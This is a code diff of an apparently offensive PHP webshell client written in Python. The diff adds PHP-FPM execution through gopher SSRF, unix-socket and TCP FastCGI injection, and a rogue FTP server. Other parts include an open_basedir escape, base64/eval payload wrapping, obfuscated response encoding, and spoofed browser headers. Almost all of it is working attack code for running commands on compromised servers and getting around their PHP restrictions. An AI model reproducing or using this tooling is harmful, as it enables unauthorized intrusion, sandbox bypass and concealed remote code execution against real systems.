@@ -24,7 +24,7 @@ from requests.utils import guess_json_utf
 from urllib3 import disable_warnings
 
 from libs.config import color, gget, gset
-from auxiliary.fpm.fpm import generate_ssrf_payload, generate_base64_socks_payload, generate_extension
+from auxiliary.fpm.fpm import generate_ssrf_payload, generate_ssrf_code_payload,  generate_base64_socks_payload, generate_base64_socks_code_payload, generate_extension
 
 LEVEL = []
 CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
@@ -364,14 +364,180 @@ def decode_g(result, key: str, options: bool):
         return b"" if options else ""
 
 
+def _bypass_open_base_dir():
+    return """$dir=pos(glob("./*", GLOB_ONLYDIR));
+$cwd=getcwd();
+$ndir="./%s";
+if($dir === false){
+$r=mkdir($ndir);
+if($r === true){$dir=$ndir;}}
+chdir($dir);
+if(function_exists("ini_set")){
+    ini_set("open_basedir","..");
+} else {
+    ini_alter("open_basedir","..");
+}
+$c=substr_count(getcwd(), "/");
+for($i=0;$i<$c;$i++) chdir("..");
+ini_set("open_basedir", "/");
+chdir($cwd);rmdir($ndir);""" % (uuid4())
+
+
+def _encode_response(encode_recv):
+    encode_head = "ob_start();" if encode_recv else ""
+    encode_tail = """$ooDoo=ob_get_clean();
+$encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
+$ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
+function encode_g($result,$key){$easy_en = strrev(str_rot13($result));$rlen = strlen($result);$klen = strlen($key);$s = str_repeat("\x00",$rlen);for($c=0;$c<$klen;$c++){$kr = strrev($key);for($i=0;$i<$rlen;$i++){$s[$i] = chr(base_convert(strrev(str_pad(base_convert(ord($easy_en[$i])^ord($key[$i%$klen]),10,2),8,"0",STR_PAD_LEFT)),2,10)^ord($kr[$i%$klen]));}$easy_en = $s;if($c == $klen - 1){break;}for($k=0;$k<$klen;$k++){$key[$k] = chr((ord($key[($k + 1)%$klen])^ord($key[$k])));}}return $s;}
+print(urlencode(encode_g($ooDoo, """ + '"' + RAND_KEY + '"' + """)));""" if encode_recv else ""
+    return encode_head, encode_tail
+
+
+def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
+    attack_type = gget("webshell.bdf_fpm.type", "webshell")
+    host = gget("webshell.bdf_fpm.host", "webshell")
+    port = gget("webshell.bdf_fpm.port", "webshell")
+    sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
+
+    if attack_type == "gopher":
+        phpcode = """
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "%s");
+curl_setopt($ch, CURLOPT_HEADER, 0);
+$o = curl_exec($ch);
+curl_close($ch);
+$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
+echo trim($o);
+""" % (generate_ssrf_code_payload(host, port, phpcode))
+    elif attack_type == "sock":
+        phpcode = """
+$sock_path='%s';
+if(function_exists('stream_socket_client') && file_exists($sock_path)){
+$sock=stream_socket_client("unix://".$sock_path);
+} else {
+die('stream_socket_client function not exist or sock not exist');
+}
+fwrite($sock, base64_decode('%s'));
+$o = '';
+while (!feof($sock)) {
+  $o .= fread($sock, 8192);
+}
+$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
+echo trim($o);
+""" % (sock_path, generate_base64_socks_code_payload(host, port, phpcode))
+    elif attack_type == "http_sock":
+        phpcode = """
+$host='%s';
+$port=%s;
+if(function_exists('fsockopen')){
+$sock=fsockopen($host, $port, $errno, $errstr, 1);
+} else if(function_exists('pfsockopen')){
+$sock=pfsockopen($host, $port, $errno, $errstr, 1);
+} else if(function_exists('stream_socket_client')) {
+$sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
+} else {
+die('fsockopen/pfsockopen/stream_socket_client function not exist');
+}
+fwrite($sock, base64_decode('%s'));
+$o = '';
+while (!feof($sock)) {
+  $o .= fread($sock, 8192);
+}
+$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
+echo trim($o);
+""" % (host, port, generate_base64_socks_code_payload(host, port, phpcode))
+    elif attack_type == "ftp":
+        php_server_port = gget(
+            "webshell.bdf_fpm.php_server_port", "webshell", False)
+
+        random_ftp_port = randint(60000, 64000)
+        if not php_server_port:
+            random_php_server_port = random_ftp_port + randint(1, 1000)
+            php_server_phpcode = get_system_code(
+                "php -n -t /tmp -S 0.0.0.0:%s" % random_php_server_port, False)
+            params_dict[raw_key][password] = php_server_phpcode
+
+            t = Thread(target=send, kwargs={
+                "phpcode": php_server_phpcode, "_in_system_command": True})
+            t.setDaemon(True)
+            t.start()
+
+            gset("webshell.bdf_fpm.php_server_port",
+                 random_php_server_port, True, "webshell")
+            php_server_port = random_php_server_port
+
+        ftp_server_phpcode = """if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
+$ftp_table = [
+    "USER" => "331 Username ok, send password.\\r\\n",
+    "PASS" => "230 Login successful.\\r\\n",
+    "TYPE" => "200 Type set to: Binary.\\r\\n",
+    "SIZE" => "550 /test is not retrievable.\\r\\n",
+    "EPSV" => "500 'EPSV': command not understood.\\r\\n",
+    "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
+    "STOR" => "150 File status okay. About to open data connection.\\r\\n",
+];
+$server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
+$accept = stream_socket_accept($server);
+fwrite($accept, "200 OK\\r\\n");
+while (true) {
+    $data = fgets($accept);
+    $cmd = substr($data, 0, 4);
+    if (array_key_exists($cmd, $ftp_table)) {
+        fwrite($accept, $ftp_table[$cmd]);
+        if ($cmd === "STOR") {
+            break;
+        }
+    } else {
+        break;
+    }
+}
+fclose($server);
+} else {
+die('stream_socket_server/stream_socket_accept function not exist');
+}""" % (host.replace(".", ","), port, random_ftp_port)
+
+        t = Thread(target=send, kwargs={
+            "phpcode": ftp_server_phpcode, "_in_system_command": True})
+        t.setDaemon(True)
+        t.start()
+        sleep(0.2)
+
+        temp_filename = uuid4()
+
+        phpcode = """function ob_end_clean(){}
+ob_start();
+%s
+$o=ob_get_clean();
+$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
+file_put_contents('/tmp/%s',$o);""" % (phpcode, temp_filename)
+
+        phpcode = "file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);" % (
+            host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)
+
+
+    params_dict[raw_key][password] = phpcode
+    res = Session.post(url, verify=False, **params_dict)
+
+    return res
+
+
 def send(phpcode: str, raw: bool = False, **extra_params):
     # extra_params['quiet'] 不显示错误信息
     offset = 8
-    encode_recv = gget("encode_recv", default=False)
+    is_encode_recv = gget("encode_recv", default=False)
+    is_fpm_eval_code = gget("webshell.bdf_fpm.use_in_eval", "webshell", False)
+    in_system_command = gget("webshell.in_system_command", "webshell", False)
+    if in_system_command:
+        gset("webshell.in_system_command", False, True, "webshell")
+
     quiet = False
     if ("quiet" in extra_params):
         del extra_params["quiet"]
         quiet = True
+
+    if ("_in_system_command" in extra_params):
+        del extra_params["_in_system_command"]
+        in_system_command = True
 
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
@@ -388,58 +554,53 @@ def send(phpcode: str, raw: bool = False, **extra_params):
     pwd_b64 = b64encode(
         gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
     raw_data = phpcode
+
     if not raw:
-        encode_head = "ob_start();" if encode_recv else ""
-        encode_tail = """$ooDoo=ob_get_clean();
-$encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
-$ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
-function encode_g($result,$key){$easy_en = strrev(str_rot13($result));$rlen = strlen($result);$klen = strlen($key);$s = str_repeat("\x00",$rlen);for($c=0;$c<$klen;$c++){$kr = strrev($key);for($i=0;$i<$rlen;$i++){$s[$i] = chr(base_convert(strrev(str_pad(base_convert(ord($easy_en[$i])^ord($key[$i%$klen]),10,2),8,"0",STR_PAD_LEFT)),2,10)^ord($kr[$i%$klen]));}$easy_en = $s;if($c == $klen - 1){break;}for($k=0;$k<$klen;$k++){$key[$k] = chr((ord($key[($k + 1)%$klen])^ord($key[$k])));}}return $s;}
-print(urlencode(encode_g($ooDoo, """ + '"' + RAND_KEY + '"' + """)));""" if encode_recv else ""
+        encode_head, encode_tail = _encode_response(is_encode_recv)
+
         phpcode = f"""error_reporting(0);ob_end_clean();print("{head}");{encode_head}chdir(base64_decode("{pwd_b64}"));""" + phpcode
+
         if (gget("webshell.bypass_obd", "webshell")):
-            phpcode = """$dir=pos(glob("./*", GLOB_ONLYDIR));
-$cwd=getcwd();
-$ndir="./%s";
-if($dir === false){
-$r=mkdir($ndir);
-if($r === true){$dir=$ndir;}}
-chdir($dir);
-if(function_exists("ini_set")){
-    ini_set("open_basedir","..");
-} else {
-    ini_alter("open_basedir","..");
-}
-$c=substr_count(getcwd(), "/");
-for($i=0;$i<$c;$i++) chdir("..");
-ini_set("open_basedir", "/");
-chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
+            phpcode = _bypass_open_base_dir() + phpcode
+
         phpcode += f"""{encode_tail}print("{tail}");"""
-        phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
-        if (not php_v7):
+
+        if (php_v7):
+            phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
+        else:
             phpcode = f"""assert(eval(base64_decode("{base64_encode(phpcode)}")));"""
+
     for func in encode_functions:
         if func in encode_pf:
             phpcode = encode_pf[func].run(phpcode)
         elif ("doughnuts" in str(func)):
             _, salt = func.split("-")
             phpcode = encode_pf["doughnuts"].run(phpcode, salt)
+
     if (raw_key == "cookies"):
         phpcode = quote(phpcode)
     params_dict['headers']['User-agent'] = fake_ua()
     params_dict['headers']['Referer'] = fake_referer()
     params_dict[raw_key][password] = phpcode
+
     try:
-        req = Session.post(url, verify=False, **params_dict)
+        if is_fpm_eval_code and not in_system_command:
+            res = _fpm_eval_phpcode(
+                url, phpcode, raw_key, password, params_dict)
+        else:
+            res = Session.post(url, verify=False, **params_dict)
     except requests.RequestException as e:
         if (not quiet):
             print(color.red(f"\nRequest Error: {e}\n"))
         return
-    if (req.apparent_encoding):
-        req.encoding = encoding = req.apparent_encoding
+
+    if (res.apparent_encoding):
+        res.encoding = encoding = res.apparent_encoding
     else:
         encoding = "utf-8"
-    text = req.text
-    content = req.content
+
+    text = res.text
+    content = res.content
     text_head_offset = text.find(head)
     text_tail_offset = text.find(tail)
     text_head_offset = text_head_offset + \
@@ -452,28 +613,33 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
         offset if (con_head_offset != -1) else 0
     con_tail_offset = con_tail_offset if (
         con_tail_offset != -1) else len(content)
-    req.r_text = text[text_head_offset: text_tail_offset]
-    req.r_content = content[con_head_offset: con_tail_offset]
-    if (not raw and encode_recv):
-        req.r_text = decode_g(req.r_text, RAND_KEY, False)
-        req.r_content = decode_g(req.r_content, RAND_KEY, True)
-    req.r_json = MethodType(r_json, req)
+
+    res.r_text = text[text_head_offset: text_tail_offset]
+    res.r_content = content[con_head_offset: con_tail_offset]
+
+    if (not raw and is_encode_recv):
+        res.r_text = decode_g(res.r_text, RAND_KEY, False)
+        res.r_content = decode_g(res.r_content, RAND_KEY, True)
+
+    res.r_json = MethodType(r_json, res)
+
     if gget("DEBUG.SEND"):  # DEBUG
         print(color.yellow("-----DEBUG START------"))
-        print(f"[{req.status_code}] {url} length: {len(req.r_text)} time: {req.elapsed.total_seconds()}", end="")
+        print(f"[{res.status_code}] {url} length: {len(res.r_text)} time: {res.elapsed.total_seconds()}", end="")
         print(f"raw: {color.green('True')}" if raw else '')
         for k, v in params_dict.items():
             print(f"{k}: ", end="")
             pprint(v)
         print("raw payload:\n" + raw_data)
-        if (req.text):
+        if (res.text):
             print(color.green("----DEBUG RESPONSE----"))
-            print(req.r_text)
+            print(res.r_text)
         else:
             print(color.green("----DEBUG RAW RESPONSE----"))
-            print(req.text)
+            print(res.text)
         print(color.yellow("------DEBUG END-------\n"))
-    return req
+
+    return res
 
 
 def delay_send(time: float, phpcode: str, raw: bool = False, **extra_params):
@@ -520,6 +686,8 @@ def prepare_system_template(exec_func: str):
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
     bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
     print_command = "print($o);" if print_result else ""
+    gset("webshell.in_system_command", True, True, "webshell")
+
     if (bdf_mode == 1):  # php7-backtrace
         return """$o=pwn(base64_decode("%s"));
 function pwn($cmd) {
@@ -1653,7 +1821,7 @@ die('stream_socket_client function not exist or sock not exist');
             } else {
                 die('fsockopen/pfsockopen/stream_socket_client function not exist');
             }"""
-            phpcode += "fputs($sock, base64_decode('%s'));" % (
+            phpcode += "fwrite($sock, base64_decode('%s'));" % (
                 generate_base64_socks_payload(host, port, ext_upload_path))
         elif attack_type == "ftp":
             random_ftp_port = randint(60000, 65000)
@@ -1686,14 +1854,17 @@ fclose($server);
 } else {
 die('stream_socket_server/stream_socket_accept function not exist');
 }""" % (host.replace(".", ","), port, random_ftp_port)
-            # send(phpcode)
-            t = Thread(target=send, args=(phpcode,))
+
+            t = Thread(target=send, kwargs={
+                       "phpcode": phpcode, "_in_system_command": True})
             t.setDaemon(True)
             t.start()
             sleep(0.2)
+
             phpcode = "var_dump(file_put_contents('ftp://%s:%s/a', base64_decode('%s')));" % (
                 host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path))
-            send(phpcode)
+
+            send(phpcode, _in_system_command=True)
             phpcode = ""
             sleep_time = 0.8
         else:
